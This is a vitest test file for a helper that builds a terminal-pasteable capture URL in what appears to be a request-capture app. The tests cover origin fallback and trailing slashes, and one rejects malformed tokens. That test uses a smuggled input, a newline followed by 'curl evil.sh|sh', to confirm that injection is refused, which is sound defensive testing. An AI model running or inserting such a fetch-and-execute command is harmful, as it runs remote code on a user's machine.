import { describe, it, expect } from "vitest";
import { holeCaptureUrl } from "./holeUrl";

describe("holeCaptureUrl", () => {
  // In production BASE_URL is "" so the app can call its own origin through
  // Nginx. A pasteable capture URL has to be absolute regardless, so it falls
  // back to the origin the user is actually browsing.
  it("uses the page origin when the API base URL is relative", () => {
    expect(holeCaptureUrl("abc123", "", "https://requesthole.example")).toBe(
      "https://requesthole.example/abc123",
    );
  });

  // In dev the page is served from :5173 but capture only answers on the
  // backend's own origin, so an explicit API base wins.
  it("uses the API base URL when one is configured", () => {
    expect(
      holeCaptureUrl(
        "abc123",
        "http://localhost:3000",
        "http://localhost:5173",
      ),
    ).toBe("http://localhost:3000/abc123");
  });

  it("does not double the separator when the base carries a trailing slash", () => {
    expect(
      holeCaptureUrl("abc123", "http://localhost:3000/", "http://x.example"),
    ).toBe("http://localhost:3000/abc123");
  });

  // The address comes straight off the route, so it is whatever the visitor
  // typed. Copying it into a terminal is the point of this string, which makes
  // an injected newline a way to run a second command on paste.
  it("refuses an address that is not a bare six-character token", () => {
    const origin = "https://requesthole.example";
    expect(holeCaptureUrl("abc\ncurl evil.sh|sh", "", origin)).toBeNull();
    expect(holeCaptureUrl("abc12", "", origin)).toBeNull();
    expect(holeCaptureUrl("abc1234", "", origin)).toBeNull();
    expect(holeCaptureUrl("abc/12", "", origin)).toBeNull();
    expect(holeCaptureUrl("", "", origin)).toBeNull();
  });
});
